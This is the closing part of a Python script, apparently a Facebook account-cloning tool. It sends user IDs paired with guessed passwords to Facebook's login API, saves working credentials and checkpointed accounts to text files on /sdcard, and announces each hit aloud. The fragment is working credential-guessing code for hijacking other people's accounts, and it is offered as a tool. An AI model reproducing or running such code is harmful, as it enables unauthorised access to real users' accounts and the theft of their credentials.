                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'Content-Length': '706'
            }
            url = "https://b-graph.facebook.com/auth/login"
            try:
                rp = requests.post(url,
                                   data=data,
                                   headers=head,
                                   allow_redirects=False,
                                   verify=True).json()
                if "session_key" in rp:
                    oks.append(uid)
                    open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
                    print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw}\033[1;97m')
                    os.system('espeak -a 300 "OK ID Found"')
                    break

                elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
                    cps.append(uid)
                    open("/sdcard/OLD_CLONING-CP.txt", "a").write(uid + "|" + pw + "\n")
                    print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw}\033[1;97m')
                    os.system('espeak -a 300 "Checkpoint ID"')
                    break
                else:
                    continue
            except:
                continue
        loop += 1
    except Exception as e:
        time.sleep(30)

# Run the program
if __name__ == "__main__":
    main()

